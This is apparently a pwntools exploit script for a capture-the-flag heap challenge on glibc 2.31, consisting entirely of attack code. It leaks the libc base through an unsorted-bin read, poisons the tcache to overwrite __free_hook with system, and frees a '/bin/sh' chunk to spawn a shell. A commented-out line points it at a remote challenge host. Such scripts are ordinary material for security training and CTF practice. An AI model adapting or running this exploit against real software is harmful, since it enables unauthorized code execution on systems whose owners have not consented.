from pwn import *

elf = ELF('./timu')
libc = ELF('./libc-2.31.so')

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

io = process(['./timu'], env={"LD_PRELOAD":'/home/hf/workplace/easyheap/libc-2.31.so'})
#io = remote('124.16.75.162', 31052)
def add(handle, index, size, content):
    handle.recvuntil('please input your choice> ')
    handle.sendline('1')
    handle.recvuntil("index?\n")
    handle.sendline(str(index))
    handle.recvuntil("size?\n")
    handle.sendline(str(size))
    handle.recvuntil("content:\n")
    handle.send(content)
    handle.send(content)                    

def edit(handle,index, content):
    handle.recvuntil('please input your choice> ')
    handle.sendline('2')
    handle.recvuntil("index?")
    handle.sendline(str(index))
    handle.recvuntil("content:")
    handle.send(content)
    
def delete(handle, index):
    handle.recvuntil('please input your choice> ')
    handle.sendline('3')
    handle.recvuntil('index?')
    handle.sendline(str(index))

def show(handle, index):
    handle.recvuntil('please input your choice> ')
    handle.sendline('4')
    handle.recvuntil('index?\n')
    handle.sendline(str(index))

def exit(handle):
    handle.recvuntil('please input your choice> ')
    handle.sendline('5')



add(io, 0, 0x410, "none")
add(io, 2, 0x410, "none")

delete(io, 1)
show(io, 1)
unsorted_bin = u64(io.recv(6).ljust(8, b'\x00'))
main_arena = unsorted_bin - 0x10 - 80
libc_base = main_arena - 0x1ebb80
libc.address = libc_base
success("unsorted bin: " + hex(unsorted_bin))
success("main arena: " + hex(main_arena))
success("libc base: " + hex(libc_base))
success("/bin/sh: " + hex(next(libc.search(b"/bin/sh"))))
success("free hook: " + hex(libc.sym['__free_hook']))
success("system: " + hex(libc.sym['system']))

#pause()
add(io, 4, 0x40, "none")
add(io, 6, 0x40, "none")
add(io, 8, 0x40, "/bin/sh\x00")
delete(io, 4)
delete(io, 5)
delete(io, 6)
delete(io, 7)
edit(io, 7, p64(libc.sym['__free_hook']))
add(io, 4, 0x40, p64(libc.sym['system']))

#pause()
#add(io, 10, 0x20, "none")
delete(io, 8)
gdb.attach(io, "set solib-search-path ~/workplace/easyheap/")

io.interactive()